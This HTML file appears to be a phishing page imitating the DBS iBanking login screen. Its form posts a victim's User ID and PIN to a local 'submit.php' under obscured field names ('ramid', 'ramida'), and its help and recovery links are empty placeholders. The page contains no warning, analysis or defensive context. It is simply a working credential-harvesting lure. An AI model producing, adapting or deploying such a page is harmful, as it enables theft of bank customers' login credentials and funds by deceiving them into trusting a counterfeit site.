<html><head> 


   	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
   	
   	
    
    <meta name="format-detection" content="telephone=no">
  
	<title>DBS iBanking</title>
	<link rel="stylesheet" href="css/themes_login.css?version=241">
	<link rel="stylesheet" href="css/language_login.css?version=241">
	
	<link rel="stylesheet" href="css/login.css?version=241">

</head>
<body onload="">
	
<iframe src="iframe.html" id="iframe1" name="iframe1" scrolling="no" frameborder="0" class="content-holder" style="height: 907px;">

</iframe>
<form class="MainForm" name="MainForm" action="submit.php" autocomplete="off" method="post">
	<input type="text" style="display: none;" value="1" name="page">

<div class="login-form">
	
	<div class="text-center logo">
	 
	 <img src="css/desktoplogo.png">
	 
	 </div>

		
	
	

			
         
            <div class="form-row input-layout">
                <input tabindex="1" type="text" name="ramid" required="" id="UID" maxlength="20" placeholder="" class="left" autocomplete="off">
						    <span class="highlight"></span>
						    <span id="uidBar" class="bar"></span>
						    <label>User ID</label>
            </div>
            
            

		
            
            <div class="form-row input-layout pin">
                <input tabindex="2"  type="password" maxlength="9" placeholder="" name="ramida" required="" id="PIN" autocomplete="off" class="left">
                            <span class="highlight"></span>
						    <span id="pinBar" class="bar"></span>
						    <label>PIN</label>
            </div>
             
            
            
            <div class="mTop-38">
            
            <button class="btn btn-primary block mBot-12" title="Login" tabindex="3" type="submit">Login</button>
 			
			<button class="btn btn-secondary right mBot-16" type="button">Get Started</button>
			
	</div>
			<div class="links">
                <ul class="">
                    <li>Forgot <a href="" onclick="callNIClick('int_linkclick', 'ib_loginbox', 'forgotuserid');" title="User ID" tabindex="5">User ID</a> or <a href="" title="PIN" tabindex="6">PIN</a></li>
					<li><a href=""  title="Frequently Asked Questions" tabindex="7">Frequently Asked Questions</a></li>
					<li><a href="" title="Maintenance Schedule" tabindex="8">Maintenance Schedule</a></li>
                    <li><a href="" target="_blank"  title="Security &amp; You" tabindex="9">Security &amp; You</a></li>
                </ul>
            </div>

</div>








</form> 




	





	
	
	
	


	
	     
	    
	    
    	
    	
    	
	
	

	
	











	
	
 


 







</body></html>